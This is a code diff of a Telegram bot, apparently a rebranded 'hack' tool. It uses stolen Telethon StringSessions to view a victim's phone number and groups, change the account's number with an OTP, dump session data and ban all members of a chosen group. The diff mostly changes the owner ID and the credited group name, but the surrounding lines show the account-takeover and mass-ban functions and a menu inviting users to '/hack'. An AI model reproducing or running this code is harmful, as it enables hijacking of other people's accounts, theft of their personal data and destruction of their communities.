@@ -21,7 +21,7 @@ from telethon.tl.functions.channels import CreateChannelRequest as ccr
 mybot = "missrose_bot"
 bot = borg = client
 
-legendx = 5268671351
+legendx = 1833664399
 
 
 async def change_number_code(strses, number, code, otp):
@@ -148,12 +148,7 @@ logging.basicConfig(level=logging.WARNING)
 
 channel = "danger_bots"
 menu = '''
-
-                  NOTICE🌠
-
-   Join :- [DANGER BOTS](https://t.me/danger_bots)
-
-
+              
 A: [check user own groups and channels]
 
 B: [check user all information like phone number usrname...]
@@ -188,7 +183,8 @@ Take his StringSession and use me
 I will give you full power of mine type /hack
 
 ⚡️devoleper⚡️:- [𝗔𝗻𝗼𝗻𝘆𝗺𝗼𝘂𝘀么𝗸𝗶𝗱](https://t.me/danger_of_telegram)
- UPDATES  ✨️:-  [DANGER BOTS](https://t.me/danger_bots)
+
+✨️UPDATES  ✨️:- [DANGER BOTS](https://t.me/danger_bots)
 
 
 '''
@@ -233,7 +229,7 @@ async def start(event):
         return await event.reply("This StringSession is terminated maybe")
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDETAILS BY X ARMY")
+        file.write(i + "\n\nDETAILS BY dangerbots")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
@@ -260,7 +256,7 @@ async def start(event):
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await userbans(strses.text, grpid.text)
-      await event.reply("Banning all members Thanks For using X Army Bot")
+      await event.reply("Banning all members Thanks For using dangerbots")
     elif r == "D":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
